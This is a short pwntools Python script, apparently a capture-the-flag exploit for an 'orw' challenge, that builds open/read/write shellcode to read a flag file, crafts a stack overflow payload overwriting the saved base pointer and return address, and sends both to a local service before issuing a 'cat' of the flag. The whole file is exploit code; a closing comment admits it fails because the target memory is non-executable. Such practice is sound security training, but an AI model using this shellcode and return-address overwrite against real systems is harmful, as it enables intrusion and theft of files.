from pwn import *

# open("/home/orw/flag")
# read(fd, buf, 0x40)
# write(1, buf, 0x40)

context.arch = 'amd64'

shellcode = asm(
    shellcraft.open('/home/orw/flag') +
    shellcraft.read('rax', 'rsp', 0x40) +
    shellcraft.write(1, 'rsp', 0x40)
)

conn = remote('localhost', 10171)


target = 0x6010a0
old_rbp = 0x00007fffffffd960 # need to push to writable memory
payload1 = shellcode.ljust(0x100, b'\x90') 
payload2 = b'A' * 16 + p64(old_rbp) + p64(target)

with open('./input.data', 'wb') as f:
    f.write(payload1)
    f.write(payload2)
print(f"[+] Payloads written to input.data")

print(f"Sending shell payload... {payload1} (len: {len(payload1)})")
conn.sendlineafter(b'shellcode>', payload1)
print(f"Sending target address... {payload2} (len: {len(payload2)})") 
conn.sendlineafter(b':)', payload2)
conn.sendline(b'cat /home/$(whoami)/flag')
conn.interactive()

# this doesn't work because bss is NX

